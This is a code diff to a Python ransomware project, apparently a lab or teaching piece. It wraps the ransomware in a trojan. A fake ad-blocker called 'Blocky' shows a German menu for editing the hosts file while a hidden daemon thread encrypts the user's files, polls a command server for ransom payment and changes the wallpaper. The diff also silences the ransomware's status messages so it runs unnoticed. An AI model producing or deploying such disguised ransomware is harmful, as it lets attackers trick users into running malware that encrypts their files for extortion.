@@ -7,11 +7,82 @@ import os, sys  # For system-related data handling (hostname/usernames)
 import base64, pathlib
 import ctypes
 from time import sleep
+from python_hosts import Hosts, HostsEntry
+import pprint
+import threading
+from multiprocessing import Process
 
 # Debug variables
 c2_url = "http://localhost:5000"
-target_paths = [".\\toencrypt"]
+target_paths = [".\\toencrypt", ".\\toencrypt2"]
 exclude_types = (".exe", ".dll", ".img")
+
+
+class FakeBlocker:
+    """This object imitates the functionality of an AdBlocker. The functionality should be to block
+    Tracking & Malware Domains using Windows' interal hosts file, which requires Administrator rights
+    to edit."""
+
+    def __init__(self):
+        self.hosts = Hosts()
+        self.blocklists = {
+            "1": (
+                "steven-black",
+                "https://raw.githubusercontent.com/StevenBlack/hosts/master/data/StevenBlack/hosts",
+            ),
+            "2": (
+                "ad-away",
+                "https://raw.githubusercontent.com/AdAway/adaway.github.io/master/hosts.txt",
+            ),
+            "3": (
+                "energized-spark",
+                "https://block.energized.pro/spark/formats/hosts.txt",
+            ),
+        }
+
+    def is_admin(self):
+        try:
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                return
+            else:
+                print(
+                    "Blocky needs Admin privileges to edit the Hosts-File. Please restart as Admin!"
+                )
+                return False
+        except Exception as err:
+            print(f"is_admin(): Error --> {err}")
+            return False
+
+    def show_menu(self):
+        print(
+            f"\nWillkommen bei Blocky!\n\n Was möchtest du tun? \n\n\t1) Aktuelle Hosts-Einträge anschauen\n\t2) Blockierliste auswählen und hinzufügen\n\t3) Blocky beenden\n"
+        )
+        choice = input("Bitte gebe einen Menüpunkt an: ")
+        if choice not in ["1", "2", "3"]:
+            main()
+        elif choice == "1":
+            self.show_hosts()
+        elif choice == "2":
+            self.add_blocklist()
+        elif choice == "3":
+            sys.exit()
+
+    def show_hosts(self):
+        # print(self.hosts)
+        pprint.PrettyPrinter().pprint(self.hosts)
+        main()
+
+    def add_blocklist(self):
+        print(f"\nWelche Blockliste möchtest du hinzufügen?\n")
+        pprint.PrettyPrinter().pprint(self.blocklists)
+        choice = input("\nBitte wähle eine Liste aus: ")
+        if choice in list(self.blocklists):
+            self.hosts.import_url(url=self.blocklists[choice][1])
+            self.hosts.write()
+            print("Deine Hostliste wurde angepasst! Webung wird nun blockiert!")
+        else:
+            self.add_blocklist()
+        main()
 
 
 class Ransomware:
@@ -121,11 +192,11 @@ class Ransomware:
                         for name in files:
                             filepath = os.path.join(path, name)
                             self.encrypt_file(filepath)
-                            print(f"🔒 Encrypted: {filepath}  -->  {filepath}.rnsm")
+                            # print(f"🔒 Encrypted: {filepath}  -->  {filepath}.rnsm")
             except Exception as err:
                 print("start_encryption(): Error --> ", err)
-            self.encryption_key = None
-            self.box = None
+        self.encryption_key = None
+        self.box = None
 
     def decrypt_file(self, filepath):
         """Takes a file path input and decrypts it using the box object of the Ransomware object"""
@@ -155,7 +226,7 @@ class Ransomware:
                         for name in files:
                             filepath = os.path.join(path, name)
                             self.decrypt_file(filepath)
-                            print(f"🔓 Decrypted: {filepath}.rnsm  -->  {filepath}")
+                            # print(f"🔓 Decrypted: {filepath}.rnsm  -->  {filepath}")
             except Exception as err:
                 print("start_decryption(): Error --> ", err)
 
@@ -176,7 +247,7 @@ class Ransomware:
             file = open(image_path, "wb")
             file.write(response.content)
             file.close()
-            print("🖼🖼🖼 Changing wallpaper...")
+            # print("🖼🖼🖼 Changing wallpaper...")
             ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
         except FileNotFoundError as err:
             print("change_wallpaper(): FileNotFound Error --> ", err)
@@ -194,24 +265,42 @@ class Ransomware:
         self.box = nacl.secret.SecretBox(bin_key)
 
 
-def main():
+def fake_main():
     rnsm = Ransomware()
     rnsm.create_remote_entry()
     rnsm.set_env_variables()
     rnsm.start_encryption()
     rnsm.fear_and_loathing()
-    print("💲💲💲 Starting loop to check for payment receival...")
+    # print("💲💲💲 Starting loop to check for payment receival...")
     while (
         httpx.post(f"{c2_url}/check/{rnsm.victim_id}").headers["Payment-Received"]
         == "False"
     ):
         sleep(5)
-        print("😴 Syncing...")
-    print("✔✔✔ Payment was received!")
+        # print("😴 Syncing...")
+    # print("✔✔✔ Payment was received!")
     rnsm.setup_decryption()
     rnsm.start_decryption()
-    print("🍾🍾🍾 You are all done, all files are now decrypted!")
+    # print("🍾🍾🍾 You are all done, all files are now decrypted!")
+
+
+def main():
+    blocky = FakeBlocker()
+    blocky.is_admin()
+    blocky.show_menu()
+
+
+class Threading(object):
+    def __init__(self):
+        thread = threading.Thread(target=self.run, args=())
+        thread.daemon = True
+        thread.start()
+
+    def run(self):
+        fake_main()
 
 
 if __name__ == "__main__":
+    tr = Threading()
     main()
+
